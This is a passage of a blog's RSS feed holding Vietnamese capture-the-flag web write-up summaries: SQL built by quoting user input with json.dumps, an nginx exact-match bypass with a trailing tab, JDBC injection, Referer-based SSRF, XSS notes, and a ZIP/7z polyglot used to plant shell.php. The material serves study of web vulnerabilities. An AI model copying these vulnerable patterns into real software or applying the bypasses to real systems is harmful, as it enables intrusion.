style=&#34;color:#a6e22e&#34;&gt;strip&lt;/span&gt;().&lt;span style=&#34;color:#a6e22e&#34;&gt;lower&lt;/span&gt;()&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;package&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;= &lt;/span&gt;request.args.get(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;package&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;strip&lt;/span&gt;().&lt;span style=&#34;color:#a6e22e&#34;&gt;lower&lt;/span&gt;()&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sql &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;SELECT distro, distro_version, package, package_version FROM packages&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; distro or package:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    sql &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; WHERE &amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; distro:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    sql &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; f&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;LOWER(distro) = {json.dumps(distro)}&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; distro and package:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    sql &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; AND &amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; package:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    sql &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; f&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;LOWER(package) = {json.dumps(package)}&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sql &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; ORDER BY distro, distro_version, package&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(sql)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;results &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; db.&lt;span style=&#34;color:#a6e22e&#34;&gt;execute&lt;/span&gt;(sql).&lt;span style=&#34;color:#a6e22e&#34;&gt;fetchall&lt;/span&gt;()&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;&#xA;&lt;li&gt;author dùng &lt;code&gt;json.dump&lt;/code&gt; để quote tham số người dùng khi ghép chuỗi SQL&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;Giải thích về &lt;code&gt;json.dump&lt;/code&gt; trong python&lt;/strong&gt;&#xA;&lt;code&gt;json.dump&lt;/code&gt; được sử dụng để serialize một object python (vd: dictionary, list, tuple, string, int, float, bool, , None) thành định dạng JSON và viết trực tiếp vào một file hoặc file-like object.&#xA;module: cần &lt;code&gt;import json&lt;/code&gt; để sử dụng&lt;/p&gt;</description>
    </item>
    <item>
      <title>PortfolioS</title>
      <link>http://localhost:1313/web/1761292330570-aaa/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/web/1761292330570-aaa/</guid>
      <description>&lt;h1 id=&#34;portfolios&#34;&gt;PortfolioS&lt;/h1&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://hackmd.io/_uploads/Hk5zfaOCee.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;Challenge file: &lt;a href=&#34;https://drive.google.com/file/d/1g-ZEzFmsgxozcKSScCvevPqiFS4w4Bgh/view&#34;&gt;public.zip&lt;/a&gt;&lt;/p&gt;&#xA;&lt;h2 id=&#34;1-phân-tích-challenge&#34;&gt;1) Phân tích challenge&lt;/h2&gt;&#xA;&lt;h3 id=&#34;11-kiến-trúc-docker-compose--mạng&#34;&gt;1.1 Kiến trúc (Docker Compose + mạng)&lt;/h3&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Hệ thống có 2 service:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;app&lt;/strong&gt;: Spring Boot (Tomcat embedded)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;nginx&lt;/strong&gt;: reverse proxy expose cổng &lt;strong&gt;8989&lt;/strong&gt; ra host, &lt;code&gt;proxy_pass http://app:8989&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Mọi truy cập từ ngoài đi &lt;strong&gt;qua nginx&lt;/strong&gt; rồi mới tới app.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://hackmd.io/_uploads/rkTvGp_Rle.png&#34; alt=&#34;image&#34;&gt;&#xA;&lt;img src=&#34;https://hackmd.io/_uploads/SJ4OMad0el.png&#34; alt=&#34;image&#34;&gt;&#xA;&lt;img src=&#34;https://hackmd.io/_uploads/Syu_Gp_Rle.png&#34; alt=&#34;image&#34;&gt;&#xA;&lt;img src=&#34;https://hackmd.io/_uploads/r1ZEET_0xg.png&#34; alt=&#34;image&#34;&gt;&#xA;&lt;img src=&#34;https://hackmd.io/_uploads/H1oMNauCgl.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;&#xA;&lt;h3 id=&#34;12-nginx-chặn-exact-match&#34;&gt;1.2 Nginx chặn exact-match&lt;/h3&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-nginx&#34; data-lang=&#34;nginx&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;location&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;/internal/testConnection&lt;/span&gt; { &lt;span style=&#34;color:#f92672&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;403&lt;/span&gt;; }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;location&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;/&lt;/span&gt; { &lt;span style=&#34;color:#f92672&#34;&gt;proxy_pass&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;http://app:8989&lt;/span&gt;; }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;&#xA;&lt;li&gt;Dùng &lt;strong&gt;exact match&lt;/strong&gt; (&lt;code&gt;=&lt;/code&gt;) → chỉ chặn đúng chuỗi &lt;code&gt;/internal/testConnection&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Nếu path có &lt;strong&gt;ký tự rác&lt;/strong&gt; ở cuối (vd: tab &lt;code&gt;%09&lt;/code&gt;) thì &lt;strong&gt;không match&lt;/strong&gt; và bị proxy vào backend.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Tomcat normalize&lt;/strong&gt; URL → trả về đường dẫn gốc &lt;code&gt;/internal/testConnection&lt;/code&gt; trước khi vào Spring.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 id=&#34;13-portfoliowar&#34;&gt;1.3 portfolio.war&lt;/h3&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Controller/route: &lt;code&gt;/login&lt;/code&gt;, &lt;code&gt;/register&lt;/code&gt;, &lt;code&gt;/dashboard&lt;/code&gt;, &lt;code&gt;/dashboard/save&lt;/code&gt;, &lt;strong&gt;&lt;code&gt;/internal/testConnection&lt;/code&gt;&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;application.properties&lt;/code&gt;:&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;spring.datasource.url=jdbc:h2:mem:ctfdb;DB_CLOSE_DELAY=-1&#xD;&#xA;spring.datasource.driver-class-name=org.h2.Driver&#xD;&#xA;server.port=8989&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;InternalController&lt;/strong&gt; (rút từ bytecode/strings + template):&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Endpoint /internal/testConnection có lỗ hổng JDBC Injection vì ghép trực tiếp username/password vào chuỗi kết nối:&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;String fullUrl = baseUrl + &amp;#34;USER=&amp;#34; + username + &amp;#34;;PASSWORD=&amp;#34; + password + &amp;#34;;&amp;#34;;&#xD;&#xA;Connection conn = DriverManager.getConnection(fullUrl);&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;Và xử lý lỗi lộ thông tin:&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;catch (Exception e) {&#xD;&#xA;model.addAttribute(&amp;#34;error&amp;#34;, &amp;#34;Connection failed: &amp;#34; + e.getMessage() + &amp;#34; | URL: &amp;#34; + fullUrl);&#xD;&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 id=&#34;14-dockerfile-giấu-flag&#34;&gt;1.4 Dockerfile (giấu flag)&lt;/h3&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;flag.txt&lt;/code&gt; được &lt;strong&gt;đổi tên ngẫu nhiên&lt;/strong&gt;:&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;RAND_NAME&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;tr -dc A-Za-z0-9 &amp;lt;/dev/urandom | head -c 16&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mv /flag.txt &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;RAND_NAME&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; rm -f /flag.txt&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;&#xA;&lt;li&gt;Nên &lt;strong&gt;phải liệt kê &lt;code&gt;/&lt;/code&gt;&lt;/strong&gt; để biết tên file flag thực tế.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 id=&#34;2-phân-tích-lỗ-hổng&#34;&gt;2) Phân tích lỗ hổng&lt;/h2&gt;&#xA;&lt;h3 id=&#34;lỗi-1--nginx-reverse-proxy-bypass&#34;&gt;Lỗi #1 — Nginx Reverse Proxy Bypass&lt;/h3&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;code&gt;location =&lt;/code&gt; chỉ chặn &lt;strong&gt;chuỗi y hệt&lt;/strong&gt;.&lt;/p&gt;</description>
    </item>
    <item>
      <title>WRITEUP: AUTHMAN (BUCKEYE 2025)</title>
      <link>http://localhost:1313/web/1763049696272-sieucapvipro/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/web/1763049696272-sieucapvipro/</guid>
      <description>&lt;h1 id=&#34;writeup-authman-buckeye-2025&#34;&gt;WRITEUP: AUTHMAN (BUCKEYE 2025)&lt;/h1&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://hackmd.io/_uploads/r1077UmxWl.png&#34; alt=&#34;image&#34;&gt;&#xA;&lt;img src=&#34;http://localhost:1313/web/1763049696272-sieucapvipro/image.png&#34; alt=&#34;alt text&#34;&gt;&lt;/p&gt;&#xA;&lt;hr&gt;&#xA;&lt;h2 id=&#34;quick-summary&#34;&gt;Quick summary&lt;/h2&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Đây là một web app Flask nhỏ&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Flag nằm ở /auth, được bảo vệ bằng HTTP Digest Auth&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Có một API check dùng Referer để tự gọi lại chính nó → đây là chỗ dị nhất, tiềm năng SSRF + logic bug&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;Cấu trúc file challenge&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;authman/app/__init__.py&lt;/code&gt; – khởi tạo Flask app, cấu hình, HTTPDigestAuth&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-python!&#34; data-lang=&#34;python!&#34;&gt;from flask import Flask&#xA;from flask_bootstrap import Bootstrap5&#xA;from flask_httpauth import HTTPDigestAuth&#xA;from config import FlaskConfig&#xA;&#xA;app = Flask(__name__)&#xA;app.config.from_object(FlaskConfig)&#xA;bootstrap = Bootstrap5(app)&#xA;&#xA;auth = HTTPDigestAuth()&#xA;@auth.get_password&#xA;def get_pw(uname):&#xA;&#x9;return app.config[&amp;#39;AUTH_USERS&amp;#39;].get(uname,None)&#xA;&#xA;from app import routes&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;code&gt;authman/app/routes.py&lt;/code&gt; – định nghĩa các route &lt;code&gt;/&lt;/code&gt;, &lt;code&gt;/auth&lt;/code&gt;, &lt;code&gt;/api/check&lt;/code&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>xss</title>
      <link>http://localhost:1313/web/xss/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/web/xss/</guid>
      <description>&lt;h1 id=&#34;xss&#34;&gt;XSS&lt;/h1&gt;&#xA;&lt;h2 id=&#34;1-browser-security-model&#34;&gt;1. Browser Security Model&lt;/h2&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Frontend chạy trong sandbox của browser, chỉ làm được những gì browser cho phép qua API (fetch, DOM, WebAPI…); không chạm trực tiếp OS như backend&lt;/li&gt;&#xA;&lt;li&gt;Không được tự ý đọc file local: chỉ đọc được file khi user chọn (input file + FileReader). Nếu không thì web nào cũng có thể ăn cắp dữ liệu máy người dùng&lt;/li&gt;&#xA;&lt;li&gt;Không gọi được system API trực tiếp: JS chỉ là ngôn ngữ, còn quyền là do browser; các API nhạy cảm (camera, mic, Bluetooth…) đều phải được user cho phép&lt;/li&gt;&#xA;&lt;li&gt;Same-Origin Policy (SOP): script chỉ truy cập được dữ liệu cùng origin; không đọc DOM/URL/nội dung của tab/iframe origin khác&lt;/li&gt;&#xA;&lt;li&gt;Browser còn dùng site isolation để tách site theo process, giảm rủi ro leak dữ liệu giữa site&lt;/li&gt;&#xA;&lt;li&gt;Nếu vượt được các giới hạn này (bypass SOP, RCE trong browser) thì đó là lỗ hổng trình duyệt, không còn là bug ứng dụng web bình thường&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 id=&#34;2-starting-with-xss-for-frontend-security&#34;&gt;2. Starting with XSS for Frontend Security&lt;/h2&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;XSS = attacker thực thi được JS trong context webstie của nạn nhân&lt;/li&gt;&#xA;&lt;li&gt;Từ XSS, attacker có thể:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Đọc token trong &lt;code&gt;localStorage&lt;/code&gt;/cookie (nếu không HTttpOnly)&lt;/li&gt;&#xA;&lt;li&gt;Thực hiện mọi hành động mà user làm được (gửi request, đổi setting, thao tác dữ liệu&amp;hellip;.)&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;Vì vậy nhiều site khi đổi mật khẩu bắt nhập lại &lt;em&gt;current password&lt;/em&gt;: dù có XSS + token thì attacker vẫn không chiếm tài khoản lâu dài nếu không biết current password&lt;/li&gt;&#xA;&lt;li&gt;Phân loại theo cách lưu trữ:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Reflected XSS&lt;/strong&gt;: payload không lưu, thường nằm trên URL/form → cần dụ từng nạn nhân click&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Stored XSS&lt;/strong&gt;: payload được lưu (comment, profile, bài viết…) → ai mở là dính, có thể lan rộng như “worm”&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Self-XSS&lt;/strong&gt;: chỉ ảnh hưởng đến chính người nhập (hoặc chỉ xuất hiện ở trang chỉ mình họ xem)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Blind XSS&lt;/strong&gt;: payload chạy ở nơi bạn không thấy (thường là admin/staff panel), phải log ngược ra server của attacker&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 id=&#34;3understanding-xss-a-bit-more&#34;&gt;3.Understanding XSS a Bit More&lt;/h2&gt;&#xA;&lt;h3 id=&#34;các-cách-thực-thi-js-khi-đã-kiểm-soát-html&#34;&gt;Các cách thực thi JS khi đã kiểm soát HTML:&lt;/h3&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Thẻ &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt;: trực diện nhưng hay bị filter/WAF, nhiều nơi (innerHTML) không thực thi script&lt;/p&gt;</description>
    </item>
    <item>
      <title>ZC-1 CHALLENGE</title>
      <link>http://localhost:1313/web/1761292219022-abc/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/web/1761292219022-abc/</guid>
      <description>&lt;h1 id=&#34;zc-1-challenge&#34;&gt;ZC-1 CHALLENGE&lt;/h1&gt;&#xA;&lt;h1 id=&#34;mta_support&#34;&gt;MTA_SUPPORT&lt;/h1&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://hackmd.io/_uploads/ry_nOA4Cxl.png&#34; alt=&#34;image&#34;&gt;&#xA;challenge file: &lt;a href=&#34;https://drive.google.com/file/d/1PprDuWV1u11dnH1mf_Bc70La8CpFZ7NR/view&#34;&gt;public&lt;/a&gt;&lt;/p&gt;&#xA;&lt;h3 id=&#34;idea-polyglot-zip7z--kích-hoạt-qua-health-nội-bộ&#34;&gt;IDEA: Polyglot ZIP→7z + kích hoạt qua “health” nội bộ&lt;/h3&gt;&#xA;&lt;p&gt;Mục tiêu: Upload 1 file vượt qua kiểm tra &lt;code&gt;ZIP safety&lt;/code&gt; của &lt;code&gt;service 1&lt;/code&gt; nhưng buộc &lt;code&gt;service 2&lt;/code&gt; giải nén và chạy shell.php, rồi dùng endpoint health để gọi file này để lấy flag CSCV2025{}.&lt;/p&gt;&#xA;&lt;p&gt;Main idea: Tạo polyglot: nhìn như zip hợp lệ với zipfile (Service 1), nhưng lại được 7-Zip (Service 2) đọc như 7z để giải nén shell.php.&lt;/p&gt;</description>
    </item>
  </channel>
</rss>
